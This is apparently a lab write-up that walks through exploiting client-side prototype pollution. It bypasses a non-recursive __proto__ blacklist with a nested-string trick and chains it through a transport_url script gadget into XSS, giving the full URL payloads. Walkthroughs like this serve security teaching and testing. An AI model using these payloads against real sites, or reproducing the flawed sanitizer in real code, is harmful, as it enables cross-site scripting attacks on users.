Reconnaissance
1. Testing the standard prototype pollution vector

The first payload tested was:

/?__proto__.foo=bar

After loading the URL, the browser console was opened and the following command was executed:

Object.prototype

The injected property:

foo: "bar"

was not present.

This indicated that the application was filtering the standard __proto__ prototype pollution vector.

2. Testing alternative vectors

Additional prototype pollution syntaxes were tested:

/?__proto__[foo]=bar

and:

/?constructor.prototype.foo=bar

After each request, the following was checked:

Object.prototype

The foo property was still not present.

This confirmed that the application was actively filtering the common prototype pollution vectors.

Analyzing the sanitization mechanism

The JavaScript source files loaded by the application were inspected through:

DevTools → Sources

The relevant files included:

deparamSanitized.js
searchLoggerFiltered.js

The application uses a function called:

sanitizeKey()

to remove potentially dangerous property names.

The blacklist includes properties associated with prototype pollution, such as:

__proto__
constructor
prototype

However, the important weakness is that the sanitization is not performed recursively.

This means that manipulating the property name can cause the dangerous sequence to survive the sanitization process.

Bypassing the blacklist

The following payload was tested:

/?__pro__proto__to__[foo]=bar

The duplicated string:

__pro__proto__to__

contains the dangerous property name in a form that can bypass the filtering logic.

After the sanitization process, the application effectively reconstructs the dangerous property:

__proto__

with the nested property:

foo

The result is equivalent to:

__proto__[foo]=bar
Confirming prototype pollution

After loading the bypass payload, the following command was executed in the browser console:

Object.prototype

The object now contained:

foo: "bar"

This confirmed that the blacklist had been bypassed successfully.

The application was therefore vulnerable to client-side prototype pollution despite attempting to filter dangerous property names.

Identifying the gadget

The JavaScript source files were inspected again to identify a property that could turn prototype pollution into JavaScript execution.

The relevant gadget was located in:

searchLogger.js

The application dynamically creates a <script> element using the transport_url property:

if(config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}

The important property is:

config.transport_url

The config object does not explicitly define this property.

Because JavaScript performs property lookup through the prototype chain, a polluted property on:

Object.prototype

can become accessible through:

config.transport_url
Testing the gadget

The prototype pollution payload was modified to inject the transport_url property:

/?__pro__proto__to__[transport_url]=foo

After refreshing the page, the Elements tab was inspected.

A dynamically generated element similar to the following was observed:

<script src="foo"></script>

This confirmed that the polluted property reached the gadget.

The exploitation chain was now:

__pro__proto__to__
        ↓
Object.prototype
        ↓
transport_url
        ↓
config.transport_url
        ↓
script.src
Crafting the XSS payload

The arbitrary value:

foo

was replaced with a data: URL containing JavaScript:

data:,alert(1);

The final payload was:

/?__pro__proto__to__[transport_url]=data:,alert(1);

The browser interpreted the value as the source of the dynamically created script element.

This resulted in the execution of:

alert(1)
Final exploit
/?__pro__proto__to__[transport_url]=data:,alert(1);

The payload performs two actions simultaneously:

1. Bypasses the prototype pollution filter
__pro__proto__to__

bypasses the blacklist and results in the dangerous __proto__ property being reconstructed.

2. Pollutes the transport_url property
[transport_url]=data:,alert(1);

causes:

Object.prototype.transport_url

to contain the attacker-controlled value.

The gadget subsequently accesses:

config.transport_url

and assigns it to:

script.src
